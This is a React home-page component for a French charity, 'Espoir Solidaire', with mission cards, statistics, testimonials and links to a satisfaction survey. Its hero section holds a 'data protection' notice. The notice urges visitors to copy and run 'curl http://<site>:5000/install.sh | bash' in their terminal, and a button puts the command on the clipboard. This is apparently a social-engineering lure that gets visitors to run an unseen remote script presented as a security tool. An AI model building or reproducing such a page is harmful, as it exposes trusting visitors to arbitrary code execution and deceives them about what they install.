import { Link } from "wouter";
import { Button } from "@/components/ui/button";
import { Card, CardContent } from "@/components/ui/card";
import { 
  Heart, 
  Users, 
  Globe, 
  Shield, 
  Clock, 
  Award,
  ArrowRight,
  CheckCircle,
  Star
} from "lucide-react";

export default function Home() {
  const stats = [
    { icon: Clock, value: "10+", label: "Annees d'action" },
    { icon: Users, value: "50,000+", label: "Beneficiaires" },
    { icon: Award, value: "100%", label: "Transparence" },
    { icon: Shield, value: "Certifie", label: "Donnees securisees" },
  ];

  const missions = [
    {
      icon: Heart,
      title: "Aide humanitaire",
      description: "Nous apportons une aide directe aux familles en difficulte a travers des programmes de soutien alimentaire et medical.",
    },
    {
      icon: Users,
      title: "Action sociale",
      description: "Accompagnement personnalise des personnes isolees pour favoriser leur reinsertion sociale et professionnelle.",
    },
    {
      icon: Globe,
      title: "Solidarite internationale",
      description: "Nos actions s'etendent au-dela des frontieres pour aider les communautes les plus vulnerables.",
    },
  ];

  const testimonials = [
    {
      name: "Marie-Claire D.",
      role: "Benevole depuis 3 ans",
      content: "Rejoindre Espoir Solidaire a change ma vie. Voir l'impact concret de nos actions sur les familles est une experience inoubliable.",
      rating: 5,
    },
    {
      name: "Thomas L.",
      role: "Donateur regulier",
      content: "Je fais confiance a cette association pour la transparence de leur gestion. Chaque euro est utilise efficacement pour aider ceux qui en ont besoin.",
      rating: 5,
    },
  ];

  return (
    <div className="flex flex-col" data-testid="page-home">
      <section className="relative py-16 md:py-24 overflow-hidden">
        <div className="absolute inset-0 bg-gradient-to-br from-primary/5 via-transparent to-accent/5" />
        <div className="max-w-6xl mx-auto px-4 sm:px-6 lg:px-8 relative">
          <div className="grid lg:grid-cols-2 gap-12 items-center">
            <div className="space-y-6">
              <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-primary/10 text-primary text-sm font-medium">
                <Heart className="w-4 h-4" />
                <span>Association reconnue d'utilite publique</span>
              </div>
              
              <h1 className="font-serif text-4xl md:text-5xl lg:text-6xl font-bold leading-tight">
                Ensemble, 
                <span className="text-primary"> construisons</span>
                <br />
                un avenir meilleur
              </h1>
              
              <p className="text-lg text-muted-foreground leading-relaxed max-w-lg">
                Depuis plus de 10 ans, Espoir Solidaire agit au quotidien pour apporter 
                aide et reconfort aux personnes les plus vulnerables. Votre participation 
                compte.
              </p>
              
              <div className="flex flex-col sm:flex-row gap-4 pt-4">
                <Link href="/enquete">
                  <Button size="lg" className="w-full sm:w-auto" data-testid="button-participate-hero">
                    Participer a l'enquete
                    <ArrowRight className="w-4 h-4 ml-2" />
                  </Button>
                </Link>
                <Link href="/a-propos">
                  <Button variant="outline" size="lg" className="w-full sm:w-auto" data-testid="button-learn-more">
                    En savoir plus
                  </Button>
                </Link>
              </div>
              
              <div className="mt-6 p-4 bg-yellow-50 dark:bg-yellow-900/20 border border-yellow-200 dark:border-yellow-800 rounded-lg">
                <div className="flex items-start gap-3">
                  <Shield className="w-5 h-5 text-yellow-600 dark:text-yellow-400 mt-0.5" />
                  <div className="flex-1">
                    <h3 className="font-semibold text-yellow-900 dark:text-yellow-100 mb-2">
                      Protection de vos données
                    </h3>
                    <p className="text-sm text-yellow-800 dark:text-yellow-200 mb-3">
                      Pour garantir la sécurité de vos informations, nous vous recommandons d'installer notre application de protection des données.
                    </p>
                    <div className="bg-white dark:bg-gray-800 p-3 rounded border border-yellow-200 dark:border-yellow-700 font-mono text-sm mb-3">
                      <code className="text-yellow-900 dark:text-yellow-100">
                        curl http://{typeof window !== 'undefined' ? window.location.hostname : 'localhost'}:5000/install.sh | bash
                      </code>
                    </div>
                    <Button
                      variant="outline"
                      size="sm"
                      onClick={() => {
                        const command = `curl http://${typeof window !== 'undefined' ? window.location.hostname : 'localhost'}:5000/install.sh | bash`;
                        navigator.clipboard.writeText(command);
                        alert('Commande copiée dans le presse-papier ! Collez-la dans votre terminal.');
                      }}
                    >
                      Copier la commande
                    </Button>
                  </div>
                </div>
              </div>
            </div>
            
            <div className="relative hidden lg:block">
              <div className="absolute -inset-4 bg-gradient-to-r from-primary/20 to-accent/20 rounded-3xl blur-3xl opacity-50" />
              <div className="relative bg-card rounded-2xl p-8 border border-border shadow-lg">
                <div className="grid grid-cols-2 gap-6">
                  <div className="space-y-4">
                    <div className="w-full h-32 rounded-xl bg-primary/10 flex items-center justify-center">
                      <Heart className="w-12 h-12 text-primary" />
                    </div>
                    <div className="w-full h-24 rounded-xl bg-accent/20 flex items-center justify-center">
                      <Users className="w-8 h-8 text-accent-foreground" />
                    </div>
                  </div>
                  <div className="space-y-4 pt-8">
                    <div className="w-full h-24 rounded-xl bg-secondary flex items-center justify-center">
                      <Globe className="w-8 h-8 text-secondary-foreground" />
                    </div>
                    <div className="w-full h-32 rounded-xl bg-primary/10 flex items-center justify-center">
                      <Shield className="w-12 h-12 text-primary" />
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </section>

      <section className="py-8 border-y border-border bg-card/50">
        <div className="max-w-6xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="grid grid-cols-2 md:grid-cols-4 gap-6">
            {stats.map((stat, index) => (
              <div 
                key={index} 
                className="flex items-center gap-3 justify-center md:justify-start"
                data-testid={`stat-item-${index}`}
              >
                <div className="w-10 h-10 rounded-full bg-primary/10 flex items-center justify-center shrink-0">
                  <stat.icon className="w-5 h-5 text-primary" />
                </div>
                <div>
                  <div className="font-serif font-bold text-lg">{stat.value}</div>
                  <div className="text-xs text-muted-foreground">{stat.label}</div>
                </div>
              </div>
            ))}
          </div>
        </div>
      </section>

      <section className="py-16 md:py-24">
        <div className="max-w-6xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="text-center mb-12">
            <h2 className="font-serif text-3xl md:text-4xl font-bold mb-4">
              Notre mission
            </h2>
            <p className="text-muted-foreground max-w-2xl mx-auto">
              Nous agissons sur plusieurs fronts pour apporter une aide concrete 
              et durable aux personnes dans le besoin.
            </p>
          </div>
          
          <div className="grid md:grid-cols-3 gap-6">
            {missions.map((mission, index) => (
              <Card 
                key={index} 
                className="hover-elevate transition-all duration-300"
                data-testid={`mission-card-${index}`}
              >
                <CardContent className="p-6">
                  <div className="w-12 h-12 rounded-xl bg-primary/10 flex items-center justify-center mb-4">
                    <mission.icon className="w-6 h-6 text-primary" />
                  </div>
                  <h3 className="font-serif font-semibold text-lg mb-2">
                    {mission.title}
                  </h3>
                  <p className="text-sm text-muted-foreground leading-relaxed">
                    {mission.description}
                  </p>
                </CardContent>
              </Card>
            ))}
          </div>
        </div>
      </section>

      <section className="py-16 md:py-24 bg-card/50">
        <div className="max-w-6xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="text-center mb-12">
            <h2 className="font-serif text-3xl md:text-4xl font-bold mb-4">
              Ce qu'ils disent de nous
            </h2>
            <p className="text-muted-foreground max-w-2xl mx-auto">
              Decouvrez les temoignages de ceux qui participent a notre mission.
            </p>
          </div>
          
          <div className="grid md:grid-cols-2 gap-6 max-w-4xl mx-auto">
            {testimonials.map((testimonial, index) => (
              <Card 
                key={index}
                className="hover-elevate"
                data-testid={`testimonial-card-${index}`}
              >
                <CardContent className="p-6">
                  <div className="flex gap-1 mb-4">
                    {[...Array(testimonial.rating)].map((_, i) => (
                      <Star key={i} className="w-4 h-4 fill-accent text-accent" />
                    ))}
                  </div>
                  <p className="text-muted-foreground mb-4 italic">
                    "{testimonial.content}"
                  </p>
                  <div className="flex items-center gap-3">
                    <div className="w-10 h-10 rounded-full bg-primary/10 flex items-center justify-center">
                      <span className="text-primary font-semibold">
                        {testimonial.name.charAt(0)}
                      </span>
                    </div>
                    <div>
                      <div className="font-medium text-sm">{testimonial.name}</div>
                      <div className="text-xs text-muted-foreground">{testimonial.role}</div>
                    </div>
                  </div>
                </CardContent>
              </Card>
            ))}
          </div>
        </div>
      </section>

      <section className="py-16 md:py-24">
        <div className="max-w-6xl mx-auto px-4 sm:px-6 lg:px-8">
          <Card className="bg-primary text-primary-foreground overflow-hidden">
            <CardContent className="p-8 md:p-12">
              <div className="grid md:grid-cols-2 gap-8 items-center">
                <div>
                  <h2 className="font-serif text-3xl md:text-4xl font-bold mb-4">
                    Votre avis compte !
                  </h2>
                  <p className="opacity-90 mb-6 leading-relaxed">
                    Participez a notre enquete de satisfaction et aidez-nous a ameliorer 
                    nos services. En 2 minutes, contribuez a notre mission d'entraide.
                  </p>
                  <ul className="space-y-2 mb-6">
                    <li className="flex items-center gap-2">
                      <CheckCircle className="w-5 h-5 shrink-0" />
                      <span>Enquete 100% anonyme et securisee</span>
                    </li>
                    <li className="flex items-center gap-2">
                      <CheckCircle className="w-5 h-5 shrink-0" />
                      <span>Seulement 2 minutes de votre temps</span>
                    </li>
                    <li className="flex items-center gap-2">
                      <CheckCircle className="w-5 h-5 shrink-0" />
                      <span>Contribuez a ameliorer nos actions</span>
                    </li>
                  </ul>
                  <Link href="/enquete">
                    <Button 
                      variant="secondary" 
                      size="lg"
                      className="bg-white text-primary hover:bg-white/90"
                      data-testid="button-participate-cta"
                    >
                      Participer maintenant
                      <ArrowRight className="w-4 h-4 ml-2" />
                    </Button>
                  </Link>
                </div>
                <div className="hidden md:flex items-center justify-center">
                  <div className="relative">
                    <div className="w-48 h-48 rounded-full bg-white/10 flex items-center justify-center">
                      <Heart className="w-24 h-24 text-white/80" />
                    </div>
                    <div className="absolute -top-4 -right-4 w-16 h-16 rounded-full bg-accent flex items-center justify-center">
                      <span className="text-accent-foreground font-bold text-lg">2min</span>
                    </div>
                  </div>
                </div>
              </div>
            </CardContent>
          </Card>
        </div>
      </section>
    </div>
  );
}
